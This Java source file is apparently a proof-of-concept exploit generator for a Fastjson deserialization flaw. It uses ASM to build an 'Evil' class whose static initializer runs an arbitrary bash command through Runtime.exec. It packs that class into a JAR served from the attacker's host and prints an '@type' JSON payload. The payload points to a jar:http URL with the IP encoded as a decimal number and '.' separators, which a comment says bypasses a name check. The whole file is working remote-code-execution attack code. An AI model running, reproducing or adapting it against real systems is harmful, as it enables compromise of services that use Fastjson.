import org.objectweb.asm.*;
import java.io.*;
import java.nio.file.*;
import java.util.jar.*;

public class GenPayload {
    static byte[] makeClass(String internal, String cmd) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internal, null, "com/vuln/fastjson/Animal", null);
        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode(); mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "com/vuln/fastjson/Animal", "<init>", "()V", false);
        mv.visitInsn(Opcodes.RETURN); mv.visitMaxs(1, 1); mv.visitEnd();
        mv = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        mv.visitCode();
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        mv.visitInsn(Opcodes.ICONST_3); mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        mv.visitInsn(Opcodes.DUP); mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn("/bin/bash"); mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP); mv.visitInsn(Opcodes.ICONST_1);
        mv.visitLdcInsn("-c"); mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP); mv.visitInsn(Opcodes.ICONST_2);
        mv.visitLdcInsn(cmd); mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitInsn(Opcodes.POP); mv.visitInsn(Opcodes.RETURN); mv.visitMaxs(5, 0); mv.visitEnd();
        cw.visitEnd(); return cw.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String lhost=args[0], lport=args[1], cmd=args[2], dec=String.valueOf(
            (Long.parseLong(lhost.split("\\.")[0])<<24)|(Long.parseLong(lhost.split("\\.")[1])<<16)|
            (Long.parseLong(lhost.split("\\.")[2])<<8)|Long.parseLong(lhost.split("\\.")[3]));
        Files.createDirectories(Paths.get("poc/www"));
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream("poc/www/exploit"))) {
            // internal name uses / → bytecode standard
            String internal = "jar:http://"+dec+":"+lport+"/exploit!/Evil";
            jos.putNextEntry(new JarEntry("Evil.class"));
            jos.write(makeClass(internal, cmd));
            jos.closeEntry();
        }
        // external name uses . → bypasses checkName('/')
        String external = "jar:http:.."+dec+":"+lport+".exploit!.Evil";
        System.out.println("[+] poc/www/exploit (Evil.class, <clinit> RCE)");
        System.out.println("Payload: {\"@type\":\"" + external + "\"}");
    }
}
